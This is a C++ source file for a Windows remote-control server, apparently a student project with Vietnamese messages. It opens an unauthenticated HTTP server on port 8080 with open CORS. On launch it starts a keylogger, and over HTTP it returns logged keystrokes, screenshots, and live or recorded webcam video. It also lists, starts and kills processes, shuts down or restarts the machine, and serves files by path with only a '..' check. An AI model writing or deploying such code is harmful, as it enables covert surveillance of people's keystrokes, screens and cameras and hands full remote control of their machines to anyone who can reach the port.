#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <thread>  
#include <gdiplus.h> 

#include "ProcessManager.h"
#include "AppManager.h"
#include "Keylogger.h"
#include "Screenshot.h"
#include "Webcam.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "Shlwapi.lib")

using namespace std;
using namespace Gdiplus;

string GetJsonValue(string body, string key) {
    string searchKey = "\"" + key + "\":";
    size_t pos = body.find(searchKey);
    if (pos == string::npos) return "";
    pos += searchKey.length();
    while (pos < body.length() && (body[pos] == ' ' || body[pos] == '"')) pos++;
    size_t endPos = pos;
    while (endPos < body.length() && body[endPos] != '"' && body[endPos] != ',' && body[endPos] != '}') endPos++;
    return body.substr(pos, endPos - pos);
}

void SendResponse(SOCKET clientSocket, string content) {
    string response = "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: " + to_string(content.length()) + "\r\n\r\n" + content;
    send(clientSocket, response.c_str(), (int)response.length(), 0);
}

void SendFileResponse(SOCKET clientSocket, string filePath) {
    ifstream f(filePath, ios::binary);
    if (!f) {
        string msg = "HTTP/1.1 404 Not Found\r\nAccess-Control-Allow-Origin: *\r\n\r\nFile not found.";
        send(clientSocket, msg.c_str(), (int)msg.length(), 0);
        return;
    }
    string content((istreambuf_iterator<char>(f)), istreambuf_iterator<char>());
    f.close();
    string contentType = "application/octet-stream";
    if (filePath.find(".png") != string::npos) contentType = "image/png";
    else if (filePath.find(".mp4") != string::npos) contentType = "video/mp4";
    string header = "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nContent-Type: " + contentType + "\r\nContent-Length: " + to_string(content.length()) + "\r\n\r\n";
    send(clientSocket, header.c_str(), (int)header.length(), 0);
    send(clientSocket, content.c_str(), (int)content.length(), 0);
}

void HandleClient(SOCKET clientSocket) {
    char buffer[8192] = { 0 };
    int bytesReceived = recv(clientSocket, buffer, 8192, 0);
    if (bytesReceived <= 0) {
        closesocket(clientSocket);
        return;
    }

    string request(buffer);

    // 1. CORS
    if (request.find("OPTIONS") == 0) {
        string cors = "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods: POST, GET, OPTIONS\r\nAccess-Control-Allow-Headers: Content-Type\r\n\r\n";
        send(clientSocket, cors.c_str(), (int)cors.length(), 0);
    }
    else if (request.find("GET /camera") != string::npos) {
        cout << "[STREAM] Dang phat Webcam (Thread ID: " << this_thread::get_id() << ")..." << endl;
        StreamWebcam(clientSocket);
    }

    else if (request.find("GET /") == 0 && request.find("GET /api") == string::npos && request.find("GET /ping") == string::npos) {
        size_t start = 5;
        size_t end = request.find(" HTTP/");
        string urlPath = request.substr(start, end - start);

        size_t questionMark = urlPath.find("?");
        if (questionMark != string::npos) {
            urlPath = urlPath.substr(0, questionMark);
        }

        string fileName = urlPath;

        if (fileName.find("..") == string::npos) {
            cout << "[FILE] Client yeu cau file: " << fileName << endl;
            SendFileResponse(clientSocket, fileName);
        }
    }
    else if (request.find("POST /control") != string::npos) {
        size_t bodyPos = request.find("\r\n\r\n");
        string jsonBody = (bodyPos != string::npos) ? request.substr(bodyPos + 4) : "";
        string cmd = GetJsonValue(jsonBody, "command");
        cout << "[CMD] " << cmd << endl;

        string result = "";
        if (cmd == "listApp") result = GetAppList();
        else if (cmd == "listProcess") result = GetProcessList();
        else if (cmd == "startApp" || cmd == "startProcess") result = StartApp(GetJsonValue(jsonBody, "name"));
        else if (cmd == "stopProcess") {
            try { result = KillProcessByID(stoi(GetJsonValue(jsonBody, "name"))); }
            catch (...) { result = "Loi: PID khong hop le"; }
        }
        else if (cmd == "getKeylog") {
            ifstream f("keylog.txt");
            if (f) { string c((istreambuf_iterator<char>(f)), istreambuf_iterator<char>()); result = c; }
            else result = "Log trong.";
        }
        else if (cmd == "startKeylogger") result = "Keylogger is running.";
        else if (cmd == "stopKeylogger") { StopKeyloggerSystem(); result = "Keylogger stopped."; }
        else if (cmd == "shutdown") { system("C:\\Windows\\System32\\shutdown.exe /s /t 5"); result = "Tat may..."; }
        else if (cmd == "restart") { system("C:\\Windows\\System32\\shutdown.exe /r /t 5"); result = "Restart..."; }

        else if (cmd == "screenshot") {
            string file = CaptureScreenshot();
            result = (file != "") ? "/" + file : "Loi chup anh";
        }
        else if (cmd == "recordWebcam") {
            string s = GetJsonValue(jsonBody, "seconds");
            int sec = 5; try { sec = stoi(s); }
            catch (...) {}
            string file = RecordWebcam(sec);
            result = (file.find("Loi") == string::npos) ? "/" + file : file;
        }
        SendResponse(clientSocket, result);
    }
    else if (request.find("GET /ping") != string::npos) SendResponse(clientSocket, "PONG");
    else SendResponse(clientSocket, "");

    closesocket(clientSocket);
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(8080);

    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, 10);

    StartKeyloggerSystem();

    cout << "=== SERVER READY (MULTI-THREADED MODE) ===" << endl;

    while (true) {
        SOCKET clientSocket = accept(serverSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) continue;

        thread t(HandleClient, clientSocket);
        t.detach();
    }

    GdiplusShutdown(gdiplusToken);
    WSACleanup();
    return 0;
}